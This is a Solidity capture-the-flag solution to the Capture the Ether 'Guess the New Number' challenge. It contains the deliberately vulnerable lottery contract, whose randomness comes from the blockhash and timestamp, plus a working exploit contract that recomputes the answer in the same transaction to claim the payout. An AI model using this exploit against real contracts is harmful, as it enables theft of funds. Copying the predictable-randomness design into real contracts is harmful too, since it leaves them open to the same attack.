pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberChallengeExploit {
    GuessTheNewNumberChallenge private guessTheNewNumberChallenge;

    function GuessTheNewNumberChallengeExploit(address _address) public {
        guessTheNewNumberChallenge = GuessTheNewNumberChallenge(_address);
    }

    function exploit() external payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessTheNewNumberChallenge.guess.value(msg.value)(answer);
    }

    function() payable {}
}

// https://capturetheether.com/challenges/lotteries/guess-the-new-number/

// Solution
// All you need is a contract to call the guess function
// with the guess being the same logic as whats in the above contract
// The block.number and now will be the same in the same transaction
// so the answer will be the same
